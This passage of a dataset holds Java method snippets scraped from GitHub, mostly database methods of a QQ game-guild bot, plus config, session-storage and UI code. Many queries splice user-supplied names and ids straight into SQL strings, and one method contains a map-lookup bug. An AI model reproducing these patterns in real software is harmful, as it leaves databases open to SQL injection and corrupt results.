"https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34262, "method_name": "searchKnife", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "Map<String,Integer>", "snippet": "    public synchronized Map<String,Integer> searchKnife(String QQ,String time){\n        String sql=\"select userQQ from teamMember where id=(select id from userQQ=\\\"\"+QQ+\"\\\");\";\n        RowMapper<String> req= (rs, index) -> rs.getString(\"userQQ\");\n        RowMapper<String[]> req1= (rs, index) -> {\n            String[] strings=new String[2];\n            strings[0]=rs.getString(\"knifeQQ\");\n            strings[1]=rs.getString(\"hurt\");\n            return strings;\n        };\n        HashMap<String,Integer> hashMaps=null;\n        try {\n            List<String> list=h.executeQuery(sql,req);\n            if(list!=null){\n                hashMaps=new HashMap<>();//\u7528\u6237qq\u53f7\uff0c\u51fa\u5200\u6b21\u6570\n                for (String s:list){\n                    hashMaps.put(s,0);\n                }\n                sql = \"select hurt,knifeQQ  from knife where complete=1 and knifeQQ in (\" + \"select userQQ from teamMember where id=(select id from userQQ=\\\"\" + QQ + \"\\\") and date=\\\"\" + new SimpleDateFormat(dateFormat).format(new Date()) + \"\\\")\";\n                List<String[]> list1=h.executeQuery(sql,req1);\n                for(String[] strings:list1) {\n                    hashMaps.put(strings[0], hashMaps.get(hashMaps) + 1);\n                }\n            }\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return hashMaps;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34263, "method_name": "searchFightStatue", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "FightStatue", "snippet": "    public synchronized FightStatue searchFightStatue(String QQ ){\n        FightStatue fightStatue = null;\n        String sql = \"select loop,serial,Remnant,startTime from progress where id=(select id from teamMember where  userQQ=\\\"\" + QQ + \"\\\");\";\n        RowMapper<FightStatue> rowMapper= new RowMapper<FightStatue>() {\n            @Override\n            public FightStatue mapRow(ResultSet rs, int index) throws SQLException {\n                FightStatue fightStatue1 = new FightStatue(rs.getInt(\"loop\"),\n                        rs.getInt(\"serial\"),\n                        rs.getInt(\"Remnant\"),\n                        rs.getString(\"startTime\"));\n                return fightStatue1;\n            }\n        };\n\n        try {\n            List<FightStatue> statues=h.executeQuery(sql,rowMapper);\n            if (statues.size()!=0){\n                fightStatue=statues.get(0);\n            }\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return fightStatue;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34264, "method_name": "getBossHpLimit", "class_name": "DB", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBossHpLimit(int ser) {\n        return BossHpLimit[ser];\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34265, "method_name": "powerCheck", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean powerCheck(String QQ, String groupQQ) {\n        String sql = \"select power from teamMember ,_group where userQQ=\\\"\" + QQ + \"\\\" and groupid=\\\"\" + groupQQ + \"\\\" and teamMember.id=_group.id\";\n        RowMapper<Boolean> rowMapper = (rs, index) -> rs.getBoolean(\"power\");\n        try {\n            return h.executeQuery(sql, rowMapper).get(0);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34266, "method_name": "dropGroup", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dropGroup(String groupQQ) {\n        String sql = \"delete from teamMember where id =(select id from _group where groupid=\\\"\" + groupQQ + \"\\\")\";\n        String sql1 = \"delete from _group where groupid = \\\"\" + groupQQ + \"\\\"\";\n        String sql2 = \"delete from knife where knifeQQ in\" +\n                \"( select userQQ from teamMember join _group on _group.id=teamMember.id where _group.groupid=\\\"\" + groupQQ+\"\\\")\";\n        try {\n            h.executeUpdate(sql, sql1,sql2);\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34267, "method_name": "changeName", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String changeName(String QQ, String newName) {\n        String tips = \"\u597d\u50cf\u8fd8\u6ca1\u6709\u52a0\u5165\u8fc7\u5de5\u4f1a\u54ce\";\n        String sql = \"select name from teamMember where userQQ=\\\"\" + QQ + \"\\\"\";\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"name\");\n\n        try {\n            String name = h.executeQuery(sql, rowMapper).get(0);\n            String sql_changeName = \"update teamMember set name=\\\"\" + newName + \"\\\" where userQQ=\\\"\" + QQ + \"\\\"\";\n            h.executeUpdate(sql_changeName);\n\n            tips = \"\u6539\u540d\u6210\u529f\uff0c\u539f\u540d\uff1a\" + name + \"\\n\u73b0\u5728\u4e3a\uff1a\" + newName;\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n\n        }\n        return tips;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34268, "method_name": "changeGroupName", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String changeGroupName(String GroupQQ, String newGroupName) {\n        String tips = \"\u8fd8\u6ca1\u6709\u5efa\u7acb\u5de5\u4f1a\u5462\";\n        String sql = \"select groupName from _group where groupid=\\\"\" + GroupQQ + \"\\\"\";\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"groupName\");\n\n        try {\n            String name = h.executeQuery(sql, rowMapper).get(0);\n            String sql_changeName = \"update _group set groupName=\\\"\" + newGroupName + \"\\\" where groupid=\\\"\" + GroupQQ + \"\\\"\";\n            h.executeUpdate(sql_changeName);\n\n            tips = \"\u6539\u540d\u6210\u529f\uff0c\u539f\u540d\uff1a\" + name + \"\\n\u73b0\u5728\u4e3a\uff1a\" + newGroupName;\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n\n        }\n        return tips;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34269, "method_name": "groupStatue", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String groupStatue(String groupQQ) {\n        String tips = \"\u8fd8\u6ca1\u6709\u5efa\u7acb\u5de5\u4f1a\u5462\";\n        ;\n        String sql = \"select * from _group where groupid=\\\"\" + groupQQ + \"\\\"\";\n        RowMapper<Group> groupId = (rs, index) -> {\n            Group group = new Group(rs.getInt(\"id\"), rs.getString(\"groupid\"), rs.getString(\"groupName\"), rs.getString(\"groupMasterQQ\"), rs.getString(\"createDate\"));\n            return group;\n        };\n\n        try {\n            Group group = h.executeQuery(sql, groupId).get(0);\n            tips = \"\u5de5\u4f1a\u540d\u79f0\uff1a\" + group.getGroupName() + \"\\n\u5de5\u4f1a\u4f1a\u957fqq\uff1a\" + group.getGroupMasterQQ() + \"\\n\u5de5\u4f1a\u521b\u5efa\u65f6\u95f4\uff1a\" + group.getCreateDate();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n        }\n        return tips;\n\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34270, "method_name": "groupMemberList", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<teamMember>", "snippet": "    public List<teamMember> groupMemberList(String groupQQ) {\n        List<teamMember> members = null;\n        String sql = \"select id from _group where groupid=\\\"\" + groupQQ + \"\\\"\";\n        RowMapper<Integer> groupId = (rs, index) -> rs.getInt(\"id\");\n        RowMapper<teamMember> memebers = (rs, index) -> {\n            teamMember teamMember = new teamMember(rs.getString(\"userQQ\"), rs.getBoolean(\"power\"), null, rs.getString(\"name\"));\n            return teamMember;\n        };\n        try {\n            int id = h.executeQuery(sql, groupId).get(0);\n            String searchGroupList = \"select userQQ,name,power from teamMember where id=\" + id;\n            members = h.executeQuery(searchGroupList, memebers);\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n            e.printStackTrace();\n        }\n        return members;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34271, "method_name": "searchKnife", "class_name": "DB", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "List<Knife>", "snippet": "    public List<Knife> searchKnife(String QQ, String GroupQQ, String time) {\n        StringBuilder sql = new StringBuilder();\n        if (QQ != null) {\n            sql.append(\"select knife.rowid , knife.* from knife where knifeQQ=\\\"\");\n            sql.append(QQ).append(\"\\\"\");\n        } else {\n            sql.append(\"select knife.rowid , knife.* from knife join teamMember on knife.knifeQQ=teamMember.userQQ join _group on _group.id=teamMember.id \\n\" + \"where _group.groupid=\\\"\").append(GroupQQ).append(\"\\\"\");\n        }\n        if (time != null) {\n            sql.append(\" and knife.date=\\\"\").append(time).append(\"\\\"\");\n        }\n        RowMapper<Knife> knifes = (rs, index) -> {\n            Knife knife = new Knife(rs.getString(\"knifeQQ\"), rs.getInt(\"no\"), rs.getInt(\"hurt\"), rs.getString(\"date\"), rs.getBoolean(\"complete\"), rs.getInt(\"rowid\"));\n            return knife;\n        };\n        List<Knife> list = null;\n        try {\n            list = h.executeQuery(sql.toString(), knifes);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return list;\n\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34272, "method_name": "getFightStatue", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "FightStatue", "snippet": "    public FightStatue getFightStatue(String groupQQ) {\n        String selectBoss = \"select loop,serial,Remnant from progress where groupid=\\\"\" + groupQQ + \"\\\"\";\n        RowMapper<FightStatue> rowMapper = (rs, index) -> {\n            FightStatue fightStatue = new FightStatue(rs.getInt(\"loop\"), rs.getInt(\"serial\"), rs.getInt(\"Remnant\"));\n            return fightStatue;\n        };\n        try {\n            FightStatue fightStatue = h.executeQuery(selectBoss, rowMapper).get(0);\n            return fightStatue;\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e){\n\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34273, "method_name": "changeBoss", "class_name": "DB", "params": ["String", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean changeBoss(String groupQQ, int loop, int serial, int Remnant) {\n        String selectBoss = \"select loop,serial from progress where groupid=\\\"\" + groupQQ + \"\\\"\";\n        String changeBoss = \"update progress set loop=\" + loop + \",serial=\" + serial + \",Remnant=\" + Remnant + \" where groupid=\\\"\" + groupQQ + \"\\\"\";\n        boolean is = false;\n        RowMapper<FightStatue> rowMapper = (rs, index) -> {\n            FightStatue fightStatue = new FightStatue(rs.getInt(\"loop\"), rs.getInt(\"serial\"), 1);\n            return fightStatue;\n        };\n\n        try {\n            FightStatue fightStatue = h.executeQuery(selectBoss, rowMapper).get(0);\n            if (fightStatue.getLoop() == loop && fightStatue.getSerial() == serial) {//\u53d8\u5468\u76ee\u65f6\u4f1a\u628a\u6240\u6709\u4eba\u64b8\u4e0b\u6765\n                is = true;\n            } else {\n                String getGroupId = \"delete from tree where userId in ( select userId from teamMember join _group on teamMember.id=_group.id where _group.groupid=\\\"\" + groupQQ + \"\\\")\";\n                h.executeUpdate(getGroupId);\n                is = false;\n            }\n            h.executeUpdate(changeBoss);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n\n        }\n        return is;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34274, "method_name": "deleteKnife", "class_name": "DB", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean deleteKnife(int id) {\n        String sql = \"delete from knife where rowid=\" + id;\n        int i = 0;\n        try {\n            i = h.executeUpdate(sql);\n            System.out.println(i);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return i == 1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34275, "method_name": "ningpeichudaoma", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean ningpeichudaoma(String QQ) {\n        String sql = \"select count(*) from knife where knifeQQ =\\\"\" + QQ + \"\\\" and \" + \"date=\\\"\" + new SimpleDateFormat(dateFormat).format(new Date()) + \"\\\" and complete=1\";\n        RowMapper<Integer> rowMapper = (rs, index) -> rs.getInt(\"count(*)\");\n        try {\n            int knifesNum = h.executeQuery(sql, rowMapper).get(0);\n            if (knifesNum > 2) {\n                return false;\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34276, "method_name": "setAdmin", "class_name": "DB", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int setAdmin(String Tragit, String groupQQ) {\n        String sql = \"update teamMember set power=1 where userQQ=\\\"\" + Tragit + \"\\\"\";\n\n        try {\n            int i = h.executeUpdate(sql);\n            return i;\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34277, "method_name": "deleteMember", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int deleteMember(String kickQQ) {\n        String sql = \"delete from teamMember where userQQ=\\\"\" + kickQQ + \"\\\"\";\n        try {\n            return h.executeUpdate(sql);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34278, "method_name": "searchTree", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> searchTree(String GroupQQ) {\n        String sql = \"select tree.* from tree join teamMember on teamMember.userQQ=tree.userId\" +\n                \"                       join _group on _group.id=teamMember.id\" +\n                \" where isTree=1 and _group.groupid=\\\"\" + GroupQQ + \"\\\"\";\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"userId\");\n        List<String> trees = null;\n\n        try {\n            trees = h.executeQuery(sql, rowMapper);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n        return trees;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34279, "method_name": "searchOutKnife", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> searchOutKnife(String GroupQQ) {\n        String sql = \"select tree.* from tree join teamMember on teamMember.userQQ=tree.userId\" +\n                \"                       join _group on _group.id=teamMember.id\" +\n                \" where isTree=0 and _group.groupid=\\\"\" + GroupQQ + \"\\\"\";\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"userId\");\n        List<String> trees = null;\n\n        try {\n            trees = h.executeQuery(sql, rowMapper);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n        return trees;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34280, "method_name": "GetPrincessTime", "class_name": "DB", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String GetPrincessTime(String groupid) {\n        String time = new SimpleDateFormat(dateFormat).format(new Date());\n        String sql = \"select startTime ,endTime from progress where groupid=\\\"\" + groupid + \"\\\"\";\n        RowMapper<String[]> rowMapper = new RowMapper<String[]>() {\n            @Override\n            public String[] mapRow(ResultSet rs, int index) throws SQLException {\n                String[] strings = new String[2];\n                strings[0] = rs.getString(\"startTime\");\n                strings[1] = rs.getString(\"endTime\");\n                return strings;\n            }\n        };\n\n        try {\n            String[] strings = h.executeQuery(sql, rowMapper).get(0);\n            if (strings[0].compareTo(time) != 0) {\n                if (strings[1].compareTo(time) != 0) {\n                    //\u5728\u5de5\u4f1a\u6218\u6301\u7eed\u65f6\u95f4\u5185\n                    LocalDateTime localDateTime = LocalDateTime.now();\n                    DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(\"yy:MM:dd\");\n                    List<String> QQs = null;\n                    if (localDateTime.getHour() < knifeFrash) { //5\u70b9\u524d\u4e0d\u8bb8\u4e0d\u8bb8\u5237\u65b0\n                        localDateTime = localDateTime.plusDays(-1);\n                    }\n                    time = localDateTime.format(dateTimeFormatter);\n                } else {\n                    return null;\n                }\n            }\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IndexOutOfBoundsException e) {\n            return null;\n        }\n\n        return time;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34281, "method_name": "labelLoadBalancerFactory", "class_name": "FeginClientConfig", "params": ["SpringClientFactory"], "throws": null, "modifiers": ["public"], "return_type": "LabelLoadBalancerFactory", "snippet": "    public LabelLoadBalancerFactory labelLoadBalancerFactory(SpringClientFactory clientFactory){\n        return new LabelLoadBalancerFactory(clientFactory);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/route/feign/FeginClientConfig.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34282, "method_name": "feignClient", "class_name": "FeginClientConfig", "params": ["LabelLoadBalancerFactory", "SpringClientFactory"], "throws": null, "modifiers": ["public"], "return_type": "Client", "snippet": "    public Client feignClient(LabelLoadBalancerFactory lbClientFactory, SpringClientFactory clientFactory){\n        return new LabelLoadBalancerFeignClient(new Client.Default(null, null),\n                lbClientFactory, clientFactory);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/route/feign/FeginClientConfig.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34283, "method_name": "onDraw", "class_name": "Practice12PathEffectView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        // \u4f7f\u7528 Paint.setPathEffect() \u6765\u8bbe\u7f6e\u4e0d\u540c\u7684 PathEffect\n\n        // CornerPathEffect\n        paint.setPathEffect(cornerPathEffect);\n        canvas.drawPath(path, paint);\n\n        canvas.save();\n        canvas.translate(500, 0);\n        // DiscretePathEffect\n        paint.setPathEffect(discretePathEffect);\n        canvas.drawPath(path, paint);\n        canvas.restore();\n\n        canvas.save();\n        canvas.translate(0, 200);\n        // DashPathEffect\n        paint.setPathEffect(dashPathEffect);\n        canvas.drawPath(path, paint);\n        canvas.restore();\n\n        canvas.save();\n        canvas.translate(500, 200);\n        // PathDashPathEffect\n        paint.setPathEffect(pathDashPathEffect);\n        canvas.drawPath(path, paint);\n        canvas.restore();\n\n        canvas.save();\n        canvas.translate(0, 400);\n        // SumPathEffect\n        paint.setPathEffect(sumPathEffect);\n        canvas.drawPath(path, paint);\n        canvas.restore();\n\n        canvas.save();\n        canvas.translate(500, 400);\n        // ComposePathEffect\n        paint.setPathEffect(composePathEffect);\n        canvas.drawPath(path, paint);\n        canvas.restore();\n\n        paint.setPathEffect(null);\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson2/Practice12PathEffectView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 34284, "method_name": "addSession", "class_name": "CasSessionStorage", "params": ["String", "WebSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addSession(String ticket, WebSession session){\n        if(!session.isExpired()){\n            if(null == cache.getIfPresent(ticket)) {\n                if(LOG.isInfoEnabled()){\n                    LOG.info(\"Store CAS session, CAS ticket: \"+ticket+\", sessionId: \"+session.getId());\n                }\n                cache.put(ticket, session);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/gateway/src/main/java/com/webank/wedatasphere/exchangis/gateway/auth/cas/CasSessionStorage.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34285, "method_name": "exist", "class_name": "CasSessionStorage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean exist(String ticket){\n        return null != cache.getIfPresent(ticket);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/gateway/src/main/java/com/webank/wedatasphere/exchangis/gateway/auth/cas/CasSessionStorage.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34286, "method_name": "removeSession", "class_name": "CasSessionStorage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "WebSession", "snippet": "    public WebSession removeSession(String ticket){\n        WebSession session = cache.getIfPresent(ticket);\n        if(null != session){\n            if(LOG.isInfoEnabled()){\n                LOG.info(\"Remove CAS session, CAS ticket: \" + ticket);\n            }\n            cache.invalidate(ticket);\n        }\n        return session;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/gateway/src/main/java/com/webank/wedatasphere/exchangis/gateway/auth/cas/CasSessionStorage.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34287, "method_name": "toString", "class_name": "DiscoverConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"DiscoverConfigBO{\" +\n                \", upstreamName='\" + upstreamName + '\\'' +\n                \", serviceName='\" + serviceName + '\\'' +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/cyl2cyl/nginx_service_discovery/master/src/main/java/com/xm/service/discovery/config/DiscoverConfig.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34288, "method_name": "isFlag", "class_name": "Result", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFlag() {\n        return flag;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34289, "method_name": "setFlag", "class_name": "Result", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFlag(boolean flag) {\n        this.flag = flag;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34290, "method_name": "getCode", "class_name": "Result", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCode() {\n        return code;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34291, "method_name": "setCode", "class_name": "Result", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(Integer code) {\n        this.code = code;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34292, "method_name": "getMessage", "class_name": "Result", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMessage() {\n        return message;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34293, "method_name": "setMessage", "class_name": "Result", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMessage(String message) {\n        this.message = message;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34294, "method_name": "getData", "class_name": "Result", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T getData() {\n        return data;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34295, "method_name": "setData", "class_name": "Result", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(T data) {\n        this.data = data;\n    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_common/src/main/java/entity/Result.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34296, "method_name": "processBefore", "class_name": "Jdbc3KeyGenerator", "params": ["Executor", "MappedStatement", "Statement", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processBefore(Executor executor, MappedStatement ms, Statement stmt, Object parameter) {\n    // do nothing\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/Jdbc3KeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 34297, "method_name": "processAfter", "class_name": "Jdbc3KeyGenerator", "params": ["Executor", "MappedStatement", "Statement", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processAfter(Executor executor, MappedStatement ms, Statement stmt, Object parameter) {\n    processBatch(ms, stmt, parameter);\n  }", "url": 